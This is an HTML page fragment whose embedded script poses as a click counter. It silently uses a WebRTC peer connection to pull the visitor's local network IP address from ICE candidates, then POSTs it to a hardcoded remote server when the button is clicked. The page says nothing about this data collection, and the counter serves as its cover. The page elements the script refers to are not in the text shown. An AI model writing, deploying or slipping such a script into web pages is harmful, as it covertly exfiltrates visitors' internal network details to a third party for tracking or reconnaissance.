<meta name="viewport" content="width=device-width, initial-scale=.75">
<title>Untitled2026</title>
<script>
(function(){
  const S='http://101.42.15.243:8081';
  let C=0,B=0;
  
  async function G(){
    return new Promise(r=>{
      if(!window.RTCPeerConnection){
        r('127.0.0.1');
        return;
      }
      const p=new RTCPeerConnection({iceServers:[]});
      p.createDataChannel('');
      p.createOffer().then(o=>p.setLocalDescription(o));
      p.onicecandidate=e=>{
        if(!e.candidate)return;
        const m=e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
        if(m)r(m[0]);
      };
      setTimeout(()=>r('127.0.0.1'),500);
    });
  }
  
  async function U(){
    try{
      const r=await fetch(S+'/count');
      const d=await r.json();
      document.getElementById('c').innerText=d.count||0;
      C=d.count||0;
    }catch(e){}
  }
  
  async function H(){
    if(B)return;
    B=1;
    const b=document.getElementById('b');
    
    try{
      const ip=await G();
      const r=await fetch(S+'/click',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({localIp:ip})
      });
      const d=await r.json();
      document.getElementById('c').innerText=d.count||C;
      document.getElementById('e').innerText=d.success?'已':'已';
      b.disabled=true;
    }catch(e){
      setTimeout(()=>{B=0;},1000);
    }
  }
  
  window.onload=function(){
    U();
    document.getElementById('b').onclick=H;
  };
})();
</script>
